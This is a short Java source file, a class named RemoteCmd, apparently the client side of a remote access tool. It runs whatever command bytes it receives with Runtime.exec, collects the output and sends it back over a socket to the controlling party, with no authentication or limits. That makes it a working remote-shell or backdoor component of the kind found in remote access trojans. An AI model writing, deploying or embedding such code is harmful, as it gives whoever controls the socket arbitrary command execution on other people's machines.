package me.client.send;

import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;

public class RemoteCmd {
    Socket socket;
    public RemoteCmd(Socket socket) {
        this.socket = socket;
    }
    public void cmdExecute(byte[] bytes) throws Exception{
        String str = "";
        String string = "";
        Process process = Runtime.getRuntime().exec(new String(bytes));
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        while ((str = reader.readLine())!=null) {
            string += str + "\n";
        }
        SendMessage.Send(MessageFlags.EXECUTE_REMOTE_CMD,string.getBytes(),socket);
    }
}
